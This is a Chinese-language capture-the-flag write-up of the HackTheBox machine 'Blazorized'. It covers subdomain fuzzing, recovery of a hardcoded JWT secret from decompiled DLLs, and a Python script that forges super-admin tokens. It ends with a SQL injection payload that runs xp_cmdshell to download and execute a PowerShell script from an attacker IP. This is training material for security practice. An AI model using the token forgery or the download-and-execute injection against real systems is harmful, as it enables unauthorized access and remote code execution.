# Blazorized

端口扫描

![image-20240801150129487](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240801150129487.png)

存在域，域名为blazorized.htb，机器名DC1

访问80端口

![image-20240801150251779](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240801150251779.png)

/etc/hosts

![image-20240801150330659](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240801150330659.png)

![image-20240801150921907](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240801150921907.png)



尝试smb连接

![image-20240801150859560](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240801150859560.png)



子域名枚举

```
ffuf -u http://blazorized.htb/ -w /home/kali/Desktop/pass/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 144,0 -t 128 -H "HOST: FUZZ.blazorized.htb"
```

![image-20240801151409633](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240801151409633.png)

把子域名admin.blazorized.htb添加到/etc/hosts

![image-20240801151729579](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240801151729579.png)



目录扫描

![image-20240801151826279](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240801151826279.png)



mssql爆破![image-20240801151916958](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240801151916958.png)



刷新blazorized.htb用bp抓包

![image-20240801153553588](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240801153553588.png)

![image-20240801154315167](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240801154315167.png)

请求了很多.dll文件，把他们下载下来利用工具反编译

![image-20240801154911044](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240801154911044.png)

```java
private const long EXPIRATION_DURATION_IN_SECONDS = 60L;
private static readonly string jwtSymmetricSecurityKey = "8697800004ee25fc33436978ab6e2ed6ee1a97da699a53a53d96cc4d08519e185d14727ca18728bf1efcde454eea6f65b8d466a4fb6550d5c795d9d9176ea6cf021ef9fa21ffc25ac40ed80f4a4473fc1ed10e69eaf957cfc4c67057e547fadfca95697242a2ffb21461e7f554caa4ab7db07d2d897e7dfbe2c0abbaf27f215c0ac51742c7fd58c3cbb89e55ebb4d96c8ab4234f2328e43e095c0f55f79704c49f07d5890236fe6b4fb50dcd770e0936a183d36e4d544dd4e9a40f5ccf6d471bc7f2e53376893ee7c699f48ef392b382839a845394b6b93a5179d33db24a2963f4ab0722c9bb15d361a34350a002de648f13ad8620750495bff687aa6e2f298429d6c12371be19b0daa77d40214cd6598f595712a952c20eddaae76a28d89fb15fa7c677d336e44e9642634f32a0127a5bee80838f435f163ee9b61a67e9fb2f178a0c7c96f160687e7626497115777b80b7b8133cef9a661892c1682ea2f67dd8f8993c87c8c9c32e093d2ade80464097e6e2d8cf1ff32bdbcd3dfd24ec4134fef2c544c75d5830285f55a34a525c7fad4b4fe8d2f11af289a1003a7034070c487a18602421988b74cc40eed4ee3d4c1bb747ae922c0b49fa770ff510726a4ea3ed5f8bf0b8f5e1684fb1bccb6494ea6cc2d73267f6517d2090af74ceded8c1cd32f3617f0da00bf1959d248e48912b26c3f574a1912ef1fcc2e77a28b53d0a";
private static readonly string superAdminEmailClaimValue = "superadmin@blazorized.htb";
private static readonly string postsPermissionsClaimValue = "Posts_Get_All";
```

看得到信息可以看出网站使用的是jwt认证

jwt生成脚本(https://medium.com/@cfmohammed24/blazorized-htb-a11592c5ac0d)



```python
import jwt
import datetime

class JWT:
    jwt_symmetric_security_key = "8697800004ee25fc33436978ab6e2ed6ee1a97da699a53a53d96cc4d08519e185d14727ca18728bf1efcde454eea6f65b8d466a4fb6550d5c795d9d9176ea6cf021ef9fa21ffc25ac40ed80f4a4473fc1ed10e69eaf957cfc4c67057e547fadfca95697242a2ffb21461e7f554caa4ab7db07d2d897e7dfbe2c0abbaf27f215c0ac51742c7fd58c3cbb89e55ebb4d96c8ab4234f2328e43e095c0f55f79704c49f07d5890236fe6b4fb50dcd770e0936a183d36e4d544dd4e9a40f5ccf6d471bc7f2e53376893ee7c699f48ef392b382839a845394b6b93a5179d33db24a2963f4ab0722c9bb15d361a34350a002de648f13ad8620750495bff687aa6e2f298429d6c12371be19b0daa77d40214cd6598f595712a952c20eddaae76a28d89fb15fa7c677d336e44e9642634f32a0127a5bee80838f435f163ee9b61a67e9fb2f178a0c7c96f160687e7626497115777b80b7b8133cef9a661892c1682ea2f67dd8f8993c87c8c9c32e093d2ade80464097e6e2d8cf1ff32bdbcd3dfd24ec4134fef2c544c75d5830285f55a34a525c7fad4b4fe8d2f11af289a1003a7034070c487a18602421988b74cc40eed4ee3d4c1bb747ae922c0b49fa770ff510726a4ea3ed5f8bf0b8f5e1684fb1bccb6494ea6cc2d73267f6517d2090af74ceded8c1cd32f3617f0da00bf1959d248e48912b26c3f574a1912ef1fcc2e77a28b53d0a"

    super_admin_email_claim_value = "superadmin@blazorized.htb"
    posts_permissions_claim_value = "Posts_Get_All"
    categories_permissions_claim_value = "Categories_Get_All"
    super_admin_role_claim_value = "Super_Admin"

    issuer = "http://api.blazorized.htb"
    api_audience = "http://api.blazorized.htb"
    admin_dashboard_audience = "http://admin.blazorized.htb"

    @staticmethod
    def get_signing_credentials():
        return JWT.jwt_symmetric_security_key

    @staticmethod
    def generate_temporary_jwt(expiration_duration_in_seconds=60):
        claims = {
            "email": JWT.super_admin_email_claim_value,
            "roles": [JWT.posts_permissions_claim_value, JWT.categories_permissions_claim_value],
            "iss": JWT.issuer,
            "aud": JWT.api_audience,
            "exp": datetime.datetime.utcnow() + datetime.timedelta(seconds=expiration_duration_in_seconds)
        }

        token = jwt.encode(
            claims,
            JWT.get_signing_credentials(),
            algorithm="HS512"
        )

        return token

    @staticmethod
    def generate_super_admin_jwt(expiration_duration_in_seconds=60):
        claims = {
            "email": JWT.super_admin_email_claim_value,
            "roles": [JWT.super_admin_role_claim_value],
            "iss": JWT.issuer,
            "aud": JWT.admin_dashboard_audience,
            "exp": datetime.datetime.utcnow() + datetime.timedelta(seconds=expiration_duration_in_seconds)
        }

        token = jwt.encode(
            claims,
            JWT.get_signing_credentials(),
            algorithm="HS512"
        )

        return token

    @staticmethod
    def verify_jwt(token):
        try:
            jwt.decode(
                token,
                JWT.jwt_symmetric_security_key,
                algorithms=["HS512"],
                issuer=JWT.issuer,
                audience=[JWT.api_audience, JWT.admin_dashboard_audience]
            )
            return True
        except jwt.ExpiredSignatureError:
            print("Token has expired")
            return False
        except jwt.InvalidTokenError:
            print("Invalid token")
            return False

# Main Program
if __name__ == "__main__":
    # Generate a temporary JWT token
    temporary_token = JWT.generate_temporary_jwt()
    print("Temporary JWT Token:")
    print(temporary_token)

    # Generate a super admin JWT token
    super_admin_token = JWT.generate_super_admin_jwt()
    print("\nSuper Admin JWT Token:")
    print(super_admin_token)

    # Optionally, verify a JWT token
    is_valid = JWT.verify_jwt(temporary_token)
    print(f"\nVerification result for Temporary JWT Token: {is_valid}")

    is_valid = JWT.verify_jwt(super_admin_token)
    print(f"Verification result for Super Admin JWT Token: {is_valid}") 
```

![image-20240801160553297](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240801160553297.png)



```
# jwt卸载命令
pip uninstall jwt
# 保险起见，将PyJWT一同卸载
pip uninstall PyJWT
# 重新安装PyJWT,进入到/usr/lib/python3/dist-packages/wfuzz/plugins/目录下
pip install PyJWT

```



jwt报错（https://blog.csdn.net/qq_39441603/article/details/129366120?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-1-129366120-blog-115222158.235%5Ev43%5Econtrol&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-1-129366120-blog-115222158.235%5Ev43%5Econtrol）

![image-20240801173216618](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240801173216618.png)

```
Temporary JWT Token:
eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InN1cGVyYWRtaW5AYmxhem9yaXplZC5odGIiLCJyb2xlcyI6WyJQb3N0c19HZXRfQWxsIiwiQ2F0ZWdvcmllc19HZXRfQWxsIl0sImlzcyI6Imh0dHA6Ly9hcGkuYmxhem9yaXplZC5odGIiLCJhdWQiOiJodHRwOi8vYXBpLmJsYXpvcml6ZWQuaHRiIiwiZXhwIjoxNzIyNTA0NzMzfQ.TIkoTWsWjzQN610ssGdnLvSFsa04AzKA1NkwVYig5fy4zTq0Y1gaS6CNCS7nNitc23q2ROYF8qNkHxJz0Iz0_g

Super Admin JWT Token:
eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InN1cGVyYWRtaW5AYmxhem9yaXplZC5odGIiLCJyb2xlcyI6WyJTdXBlcl9BZG1pbiJdLCJpc3MiOiJodHRwOi8vYXBpLmJsYXpvcml6ZWQuaHRiIiwiYXVkIjoiaHR0cDovL2FkbWluLmJsYXpvcml6ZWQuaHRiIiwiZXhwIjoxNzIyNTA0NzMzfQ.2v6I8wkTbKeiC_3XL2nbZFyDfIX2PnuceS9B5KXSLbcR_auRGIsxvlRb5FPMZjG0Tdf6YjRsLCqOQnotGbVGdw

Verification result for Temporary JWT Token: True
Verification result for Super Admin JWT Token: True
```

输入密钥生成payload

```
eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InN1cGVyYWRtaW5AYmxhem9yaXplZC5odGIiLCJyb2xlcyI6WyJTdXBlcl9BZG1pbiJdLCJpc3MiOiJodHRwOi8vYXBpLmJsYXpvcml6ZWQuaHRiIiwiYXVkIjoiaHR0cDovL2FkbWluLmJsYXpvcml6ZWQuaHRiIiwiZXhwIjoxNzIyNTExMjQ3fQ.qUdFM_AY0uVyvtI4Ys5CX5KSMlEtm0ngOh6mLXeyri3qKywSbNoUr1REPDHpYra3PtvkNuC8wo3Ww5oxbIbX_Q
```

回到浏览器

```
localStorage.setItem('jwt', 'eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InN1cGVyYWRtaW5AYmxhem9yaXplZC5odGIiLCJyb2xlcyI6WyJTdXBlcl9BZG1pbiJdLCJpc3MiOiJodHRwOi8vYXBpLmJsYXpvcml6ZWQuaHRiIiwiYXVkIjoiaHR0cDovL2FkbWluLmJsYXpvcml6ZWQuaHRiIiwiZXhwIjoxNzIyNTEyNDc4fQ.zcUYJdiObhdxM3sb2Lmx3Sgr46cZahqOD0p1BROJVSaqGEQV0kgu9W84tsdXMCHzTQLQtRXFFOmuvh7_81kksg');
```

刷新页面

![image-20240801175327650](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240801175327650.png)

















admin.blazorized.htb

![image-20240801152348351](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240801152348351.png)





```
'; IF (SELECT CONVERT(INT, value_in_use) FROM sys.configurations WHERE name = 'xp_cmdshell') = 1    EXEC master.dbo.xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''<http://10.10.16.5:8000/payload.ps1>'')" --
```

